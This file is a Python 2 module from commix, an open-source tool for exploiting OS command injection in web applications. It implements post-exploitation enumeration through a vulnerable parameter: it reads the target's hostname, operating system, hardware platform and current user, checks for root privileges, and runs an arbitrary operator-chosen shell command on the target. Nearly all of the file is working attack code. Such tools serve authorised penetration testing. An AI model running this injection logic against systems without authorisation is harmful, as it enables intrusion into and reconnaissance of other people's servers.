#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import sys

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.injections.results_based.techniques.classic import cb_injector

"""
  The "classic" technique on Result-based OS Command Injection.
"""

def do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln_parameter):
    
  # Hostname enumeration
  if menu.options.hostname:
    cmd = settings.HOSTNAME
    response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
    shell = cb_injector.injection_results(response,TAG)
    if shell:
      if menu.options.verbose:
	print ""
      shell = "".join(str(p) for p in shell)
      if not menu.options.verbose:
	print ""
      sys.stdout.write(colors.BOLD + "(!) The hostname is " + colors.UNDERL + shell + colors.RESET + ".")
      sys.stdout.flush()
      
  # Retrieve system information
  if menu.options.sys_info:
    cmd = settings.RECOGNISE_OS	    
    response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
    target_os = cb_injector.injection_results(response,TAG)
    if target_os:
      target_os = "".join(str(p) for p in target_os)
      if target_os == "Linux":
	cmd = settings.RECOGNISE_HP
	response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
	target_arch = cb_injector.injection_results(response,TAG)
	if target_arch:
	  print ""
	  target_arch = "".join(str(p) for p in target_arch)
	  sys.stdout.write(colors.BOLD + "(!) The target operating system is " + colors.UNDERL + target_os + colors.RESET)
	  sys.stdout.write(colors.BOLD + " and the hardware platform is " + colors.UNDERL + target_arch + colors.RESET + ".")
	  sys.stdout.flush()
      else:
	sys.stdout.write(colors.BOLD + "(!) The target operating system is " + colors.UNDERL + target_os + colors.RESET + ".")
	sys.stdout.flush()

  # The current user enumeration
  if menu.options.current_user:
    cmd = settings.CURRENT_USER
    response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
    cu_account = cb_injector.injection_results(response,TAG)
    if cu_account:
      cu_account = "".join(str(p) for p in cu_account)
      # Check if the user have super privilleges.
      if menu.options.is_root:
	cmd = settings.ISROOT
	response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
	shell = cb_injector.injection_results(response,TAG)
	sys.stdout.write(colors.BOLD + "\n(!) The current user is " + colors.UNDERL + cu_account + colors.RESET)
	if shell:
	  shell = "".join(str(p) for p in shell)
	  if shell != "0":
	      sys.stdout.write(colors.BOLD + " and it is " + colors.UNDERL + "not" + colors.RESET + colors.BOLD + " privilleged" + colors.RESET + ".")
	      sys.stdout.flush()
	  else:
	    sys.stdout.write(colors.BOLD + " and it is " + colors.UNDERL + "" + colors.RESET + colors.BOLD + " privilleged" + colors.RESET + ".")
	    sys.stdout.flush()
      else:
	sys.stdout.write(colors.BOLD + "\n(!) The current user is " + colors.UNDERL + cu_account + colors.RESET + ".")
	sys.stdout.flush()
	
  print ""
  # Single os-shell execution
  if menu.options.os_shell:
    cmd =  menu.options.os_shell
    response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
    shell = cb_injector.injection_results(response,TAG)
    if shell:
      if menu.options.verbose:
	print ""
      shell = "".join(str(p) for p in shell)
      print "\n" + colors.GREEN + colors.BOLD + shell + colors.RESET
      sys.exit(0)

# eof